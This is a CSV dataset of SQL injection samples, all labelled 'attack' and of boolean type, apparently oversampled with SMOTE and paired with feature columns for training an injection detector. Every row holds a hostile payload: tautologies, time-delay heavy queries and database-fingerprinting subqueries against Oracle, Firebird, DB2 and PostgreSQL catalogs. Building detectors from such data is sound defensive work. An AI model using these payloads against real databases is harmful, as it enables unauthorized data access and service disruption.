id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000240,attack,boolean,"1'+  (  select mcfb where 4050  =  4050 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3   )    )   +'",nearest_attack_euclidean,R000502,1.5175001373669756,157.53180697171848,34.99091229379472,4.272988889422912,79.0,16.0,45.02726311861584,17.50454385310264,0.5017337762859659,0.1016169673490564,0.2855474158044149,0.11110184056056273,1.5045438531026407,0.0,0.9909122937947186,-1.3877787807814457e-17,1.0,2.0,0.0,5.504543853102641,0.0,-1.1102230246251565e-16,2.0,5.495456146897359,1.0,0.0,0.49545614689735923,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,2.0,0.0,1.0,1.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000241,attack,boolean,"1"" and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000425,0.5060587861104279,131.94499306289714,31.444287696315104,4.166550768930466,72.0,8.722143848157552,35.22284921473958,16.0,0.5459831835750368,0.06621975085313911,0.26646746922181586,0.1213295963500082,0.0,1.0,2.0,-1.3877787807814457e-17,1.0,1.0,0.0,4.555712303684896,0.0,-1.1102230246251565e-16,2.722143848157552,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000242,attack,boolean,"1'+  (  select thmg where 2546  =  2546 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000709,0.20120414417524443,156.66715385308606,32.06656922938279,4.138263282311363,76.73372308246884,18.0,41.06656922938279,20.866861541234417,0.48976800524890973,0.1149007387967001,0.2621563049378382,0.133174951016552,0.933430770617209,0.0,2.0,-1.3877787807814457e-17,1.0,2.0,0.0,5.0,0.0,5.0,4.0,5.933430770617209,0.933430770617209,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.9334307706172091,0.0,1.0,1.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.933430770617209
SMOTE_000243,attack,boolean,"1%""   )    )    or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%""  =  """,nearest_attack_euclidean,R000644,0.059317872942243235,141.52173829485974,34.0,3.4262298275823424,34.0,15.0,68.4173906358878,24.10434765897195,0.24030157803648342,0.10601540207491915,0.48336733246957475,0.17031568741902264,2.0,4.0,0.0,1.0,0.0,2.0,0.0,12.104347658971951,1.9999999999999998,-1.1102230246251565e-16,1.0,3.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000244,attack,boolean,"1' or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000687,0.0007573236807997858,92.00572527432615,28.0,3.70590362895323,31.0,13.0,35.00458021946093,13.00114505486523,0.33693663340384233,0.14129600755645,0.38045954679392535,0.1413078122457823,1.0,0.0,2.0,-1.3877787807814457e-17,1.0,1.0,0.0,6.001145054865232,0.0,1.0,1.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000245,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  ""seci""  =  ""seci",nearest_attack_euclidean,R000465,0.038925291075098435,116.24873484749816,26.12436742374908,4.051074712648822,73.14509532770727,3.0207279039581802,27.04145580791636,13.04145580791636,0.6292210004139733,0.025973749482533295,0.2326301880950867,0.11217506200840663,0.0,3.0,0.0,-1.3877787807814457e-17,1.0,1.0,0.0,3.0,0.0,-1.1102230246251565e-16,2.0207279039581802,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000246,attack,boolean,"1%""   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   ""%""  =  """,nearest_attack_euclidean,R000115,0.13117070277957957,129.84561468130246,27.0,3.2099730241583773,34.0,13.0,65.03801223441872,17.807602446883745,0.26234209180535895,0.10030727039616666,0.5002617559922158,0.13708888180625856,0.0,4.0,0.0,-1.3877787807814457e-17,0.0,2.0,0.0,9.807602446883743,1.9999999999999998,-1.1102230246251565e-16,2.220446049250313e-16,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
SMOTE_000247,attack,boolean,"1   )    )     )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000611,0.07844064238773073,133.0,29.097655432143377,3.890195857639398,64.35806991785905,8.032551810714459,44.641930082140945,15.967448189285541,0.4838952625402936,0.06039512639634932,0.3356536096401575,0.12005600142319955,0.0,0.0,2.0,-1.3877787807814457e-17,1.0,1.0,0.0,6.902344567856622,0.0,-1.1102230246251565e-16,2.0325518107144593,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000248,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ynpr'  =  'ynpr",nearest_attack_euclidean,R000139,1.1100630924163837,151.04476104483288,31.977619477583563,4.165774544269799,83.95523895516712,8.48880973879178,41.089522089665756,17.51119026120822,0.556103046649308,0.05625432301076806,0.27173236095544945,0.11591026938447452,4.0,0.0,0.0,-1.3877787807814457e-17,1.0,1.511190261208219,0.0,5.022380522416438,0.0,-1.1102230246251565e-16,2.4888097387917805,2.5111902612082195,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000249,attack,boolean,"1%"" and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000295,0.6222357699062827,128.65714121409755,32.062856485639024,4.19209079655438,72.0,8.531428242819512,32.062856485639024,16.062856485639024,0.5598379881609703,0.06626092505043488,0.24915476430107186,0.12474632248752293,0.0,1.0,2.0,-1.3877787807814457e-17,1.0,1.0,0.0,4.0,1.0,-1.1102230246251565e-16,2.531428242819512,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000250,attack,boolean,"1  )   where 7978  =  7978 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000656,0.6294534077953127,149.93075198145266,34.22835999420395,3.829703934819764,42.47403199304474,24.0,57.96537599072633,25.491343997681582,0.2831070454821991,0.16039497515834333,0.3863868925961734,0.17011108676328407,0.24567199884079027,0.0,2.0,-1.3877787807814457e-17,0.0,2.0,0.0,11.245671998840791,0.0,2.0,1.0,10.0,0.24567199884079033,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000251,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  'ctbs' like 'ctbs",nearest_attack_euclidean,R000171,0.2168116510150129,129.87777924031036,26.626985171650254,4.006749920288746,77.87777924031036,3.1253970343300512,34.7492059313399,14.125397034330051,0.5995009416607465,0.024027751921320423,0.2677225998479243,0.10874870657000864,3.0,0.0,0.0,-1.3877787807814457e-17,1.0,0.0,0.0,4.874602965669949,0.0,-1.1102230246251565e-16,2.1253970343300512,1.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000252,attack,boolean,"1""  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  ""rkvr""  =  ""rkvr",nearest_attack_euclidean,R000174,0.3712346476160931,124.91315325510831,28.503618614370488,3.4825513679878584,42.0,13.0,55.92762771259026,13.985525542518053,0.3393609949800046,0.10504030797000141,0.4441455255983281,0.11145317145166592,0.0,4.0,0.0,-1.3877787807814457e-17,0.0,2.0,0.0,7.985525542518053,0.0,-1.1102230246251565e-16,2.220446049250313e-16,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
SMOTE_000253,attack,boolean,"1  )   where 5465  =  5465 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000240,0.1088502065858313,146.42800175167042,32.0,4.1038927488360075,75.08300102180775,16.0,40.47600058389014,14.869000145972535,0.5127064794366352,0.10935770925940348,0.2763761930940607,0.10155961820990059,0.0,0.0,2.0,-1.3877787807814457e-17,1.0,2.0,0.0,4.869000145972536,0.0,-1.1102230246251565e-16,2.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000254,attack,boolean," select * from users where id  =  1 or @#"".  =  1 or 1  =  1 -- 1",nearest_attack_euclidean,R000016,2.502351495159713,64.64363845953042,22.821819229765214,3.5336913544171598,26.0,4.821819229765213,24.0,9.821819229765213,0.40226261295536236,0.07452992860490519,0.3713193350357191,0.15188812340401334,0.0,1.1781807702347868,2.0,-1.3877787807814457e-17,1.0,2.821819229765213,0.0,0.1781807702347864,0.0,-1.1102230246251565e-16,2.220446049250313e-16,6.0,0.0,1.0,1.0,0.8218192297652134,0.0,1.0,0.17818077023478673,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000255,attack,boolean,"1%' and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000496,0.06360462209334691,119.73934056689728,31.086981243164384,4.169537609096113,65.30443435107534,8.043490621582192,31.260943729493157,15.130471864746578,0.5454875525784505,0.0671812073302708,0.26100671936702113,0.1263245207242575,1.0,0.0,2.0,-1.3877787807814457e-17,1.0,1.0,0.0,4.043490621582192,1.0,-1.1102230246251565e-16,2.0434906215821926,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000256,attack,boolean,"-9166""  )   as hlre where 4768  =  4768 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --",nearest_attack_euclidean,R000577,0.32962332614780826,148.99912875882467,38.0,4.395163682126432,60.69190558099599,26.0,42.69190558099599,19.615317596832664,0.40723074273129917,0.17481913292210366,0.28620211224676584,0.1317480120998313,4.0,1.0,3.0,-1.3877787807814457e-17,0.0,2.0,0.0,4.615317596832666,0.0,-1.1102230246251565e-16,2.220446049250313e-16,9.0,1.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,1.0,1.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000257,attack,boolean,"1%"" or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000333,0.6807030786098128,92.59365815855054,28.593658158550543,3.73324715145242,31.0,13.0,35.0,13.593658158550543,0.33480558638206326,0.1404023426763491,0.3780063072055553,0.14678576373603236,0.0,1.0,2.0,-1.3877787807814457e-17,1.0,1.0,0.0,6.0,0.5936581585505429,1.0,1.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000258,attack,boolean,"1""   )    )    or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   ""lazm"" like ""lazm",nearest_attack_euclidean,R000123,0.8248754709383433,158.3723401607396,30.624822677382642,3.9326573486013334,75.49929070953057,10.0,50.24822677382641,22.624822677382642,0.47717357521632275,0.0632786298245459,0.316524914970846,0.14302287998828542,0.0,4.0,0.0,-1.3877787807814457e-17,1.0,1.3751773226173587,0.0,7.249645354765282,0.0,5.0,4.0,2.375177322617359,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000259,attack,boolean,1'   )    )    and 7533  =  7533 and    (    (   'gvoh'  =  'gvoh,nearest_attack_euclidean,R000563,0.19968233241931677,65.08252908029365,16.412645401468275,2.9736659976730904,14.330116321174621,9.0,31.83494183941269,9.917470919706345,0.2201170521566991,0.13828840053085248,0.4891912095553445,0.15240333775710393,4.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.9174709197063446,0.0,4.0,0.0,-1.1102230246251565e-16,2.220446049250313e-16,1.9174709197063446,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000260,attack,boolean,1'   )    )    and 3355  =  6012 and    (    (   'ofmy'  =  'ofmy,nearest_attack_euclidean,R000613,0.054766070032869776,65.0,17.77412882453515,3.027327604930077,14.0,9.0,32.0,10.0,0.2153846153846154,0.13846153846153847,0.49230769230769234,0.15384615384615385,4.0,0.0,0.0,-1.3877787807814457e-17,0.0,2.0,0.0,4.0,0.0,-1.1102230246251565e-16,2.220446049250313e-16,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000261,attack,boolean,"1""   )    )     )   rlike   (  select   (  case when   (  6915  =  4531  )   then 1 else 0x28 end   )    )    and    (    (     (  ""jzzu""  =  ""jzzu",nearest_attack_euclidean,R000421,0.5416657657203026,142.763596666478,29.7290789999434,3.2699424865543514,42.0,13.0,70.6108773331824,17.1527193332956,0.2945493291627153,0.09117003045512617,0.4942297440120384,0.12005089637012012,0.0,4.0,0.0,-1.3877787807814457e-17,0.0,2.0,0.0,11.1527193332956,0.0,-1.1102230246251565e-16,2.220446049250313e-16,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
SMOTE_000262,attack,boolean,"1'  )   as zxho where 5907  =  5907 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000618,0.0016085273885577413,136.98115975934047,36.0,3.859779452801466,41.98743983956031,23.0,53.99581327985344,17.99790663992672,0.30651634056383803,0.16790792230469714,0.3941858914424918,0.1313898456889731,2.9979066399267182,0.0,2.0,1.0,0.0,2.0,0.0,9.0,0.0,-1.1102230246251565e-16,1.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000263,attack,boolean,"1""   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   ""ubxw"" like ""ubxw",nearest_attack_euclidean,R000208,0.35383220629378903,133.44361849375503,32.0,3.647962041896451,46.0,13.0,56.536348744795845,17.90726974895917,0.34749570790968276,0.09820530875708425,0.42036741958559437,0.1339315637476386,0.0,4.0,0.0,-1.3877787807814457e-17,1.0,1.0,0.0,9.90726974895917,0.0,1.0,1.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000264,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  'cewn'  =  'cewn",nearest_attack_euclidean,R000204,0.27194893852931756,87.32121495632478,27.0,3.8266614711354303,38.88080997088319,8.0,28.440404985441596,12.0,0.44470209968708774,0.09184740702603264,0.32567938274783065,0.13777111053904897,3.0,0.0,0.0,-1.3877787807814457e-17,1.0,1.0,0.0,4.860101246360399,0.13989875363960128,1.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000265,attack,boolean,"1""   )    )     )   and 7533  =  7533 and    (    (     (  ""alvd"" like ""alvd",nearest_attack_euclidean,R000575,1.0944698275288478,77.95353682159023,19.34424418590828,3.0553154667213382,18.000000000000004,10.562829457272187,38.0,11.390707364318047,0.2311300092935958,0.1348591954773187,0.4879411307309245,0.14606966449816097,0.0,4.0,0.0,-1.3877787807814457e-17,0.3907073643180465,1.0,0.0,6.0,0.0,-1.1102230246251565e-16,2.220446049250313e-16,1.3907073643180468,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000266,attack,boolean,"1%"" or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000175,0.024285547367696902,118.05698860275774,31.0,4.17404575097248,64.00949810045962,8.0,31.037992401838498,15.009498100459624,0.5422002122251053,0.06776545183009418,0.26289751617902224,0.1271368197657784,0.0,1.0,2.0,-1.3877787807814457e-17,1.0,1.0,0.0,4.009498100459624,1.0,-1.1102230246251565e-16,2.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,0.009498100459624403,0.9905018995403756,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000267,attack,boolean,"1%""  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000081,0.015589144125836594,134.94488571141352,32.96693142684811,4.236540878378424,71.0,8.988977142282703,36.977954284565406,17.977954284565406,0.5261488954125151,0.06661013919119335,0.2740206870139048,0.1332202783823867,0.0,1.0,2.0,-1.3877787807814457e-17,1.0,1.0,0.0,5.0,1.0,-1.1102230246251565e-16,2.988977142282703,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000268,attack,boolean,"1""  )   as buky where 7898  =  7898 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000061,1.1989810966831118,153.47690440459004,34.04619119081989,4.143234550164599,73.47690440459004,18.0,42.0,20.0,0.4787434153453529,0.1172827315472956,0.27365970694368974,0.13031414616366177,0.0,1.0,2.0,-1.3877787807814457e-17,1.0,2.0,0.0,5.0,0.0,5.0,4.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,0.47690440459005334,0.5230955954099467,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
